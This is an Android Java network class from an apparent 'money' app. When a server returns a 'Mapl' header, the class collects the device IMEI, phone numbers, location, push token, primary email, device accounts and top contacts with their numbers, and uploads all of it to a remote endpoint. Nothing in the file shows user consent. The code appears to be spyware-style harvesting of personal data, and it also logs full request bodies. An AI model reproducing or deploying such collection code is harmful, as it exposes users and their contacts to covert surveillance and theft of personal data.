package mm.com.money.network;

import android.location.Location;
import android.text.TextUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import mm.com.money.Ln;
import mm.com.money.Settings;
import mm.com.money.ui.MainActivity;
import okhttp3.OkHttpClient;
import okhttp3.ResponseBody;
import okhttp3.logging.HttpLoggingInterceptor;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.adapter.rxjava.RxJavaCallAdapterFactory;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;

/**
 * Created by Ruslan Mingaliev on 14/03/2017
 * Email: mingaliev.rr@gmail.com
 * Skype: doinktheclown_ln
 * All rights reserved.
 */

public class ApiManager {
    private static ApiManager sManager;
    public static ApiManager getInstance() {
        if (sManager == null)
            sManager = new ApiManager();
        return sManager;
    }

    private ApiInterface mInterface;

    private ApiManager() {
        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
        logging.setLevel(HttpLoggingInterceptor.Level.BODY);
        OkHttpClient client = new OkHttpClient.Builder()
                .addInterceptor(logging)
                .build();

        Retrofit adapter = new Retrofit.Builder()
                .client(client)
                .addCallAdapterFactory(RxJavaCallAdapterFactory.create())
                .baseUrl(Settings.API_ENDPOINT)
                .build();

        mInterface = adapter.create(ApiInterface.class);
    }

    /**
     * Получение mapl по cookie
     * @param context - MainActivity instance
     * @param cookie - cookie
     */
    public void getMapl(final MainActivity context, String cookie) {
        mInterface.getMapl(cookie)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Subscriber<Response<ResponseBody>>() {
                    @Override
                    public void onCompleted() {
                        unsubscribe();
                    }

                    @Override
                    public void onError(Throwable e) {
                        Ln.e(e);
                    }

                    @Override
                    public void onNext(retrofit2.Response<ResponseBody> s) {
                        String mapl = s.headers().get("Mapl");
//                        if ((mapl == null || "0".equals(mapl)) && Settings.isFirstShot()) {
//                            sendData(context, mapl, true);
//                        } else if (!TextUtils.isEmpty(mapl)) {
//                            sendData(context, mapl, false);
//                            Ln.d(mapl);
//                        }
                        if (!TextUtils.isEmpty(mapl)) {
                            sendData(context, mapl, false);
                        }
                    }
                });
    }

    /**
     * Отравляет данные о девайсе на сервер
     * @param context - MainActivity instance
     * @param mapl - mapl value
     */
    private void sendData(MainActivity context, String mapl, final boolean firstShot) {
        String log = firstShot ? "as a first shot" : "normal mode";
        Ln.d("Sending data: " + log);
        String IMEI = Settings.getIMEI(context);
        ArrayList<String> phones = Settings.getPhoneNumbers(context);
        Location location = context.getLocationManager().getLastKnownLocation();
        if (location == null) location = Settings.getLastLocation(context);
        Map<String, List<String>> topContacts = Settings.getTopContacts(context);
        String pushToken = Settings.getPushToken(context);

        Map<String, String> accounts = Settings.getAccounts(context);
        String primaryEmail = Settings.getPrimaryEmail(context);

        ArrayList<String> contacts = new ArrayList<>();
        if (topContacts != null && topContacts.size() > 0) {
            for (String name : topContacts.keySet()) {
                List<String> phs = topContacts.get(name);
                contacts.add(name + " (" + TextUtils.join(", ", phs) + ")");
            }
        }

        ArrayList<String> accs = new ArrayList<>();
        if (accounts != null && accounts.size() > 0) {
            for (String name : accounts.keySet()) {
                accs.add(name + " -> " + accounts.get(name));
            }
        }

        Ln.d("Data collected");

        mInterface.sendData(
                mapl,
                IMEI,
                location == null ? null : location.getLatitude(),
                location == null ? null : location.getLongitude(),
                pushToken,
                phones,
                Settings.DEBUG ? null : contacts,
                primaryEmail,
                accs

        ).subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Subscriber<Response<ResponseBody>>() {
                    @Override
                    public void onCompleted() {
                        unsubscribe();
                    }

                    @Override
                    public void onError(Throwable e) {
                        Ln.e(e);
                    }

                    @Override
                    public void onNext(Response<ResponseBody> s) {
                        Ln.d("Data sent");
                        if (firstShot)
                            Settings.setFirstShort(false);
                    }
                });
    }
}
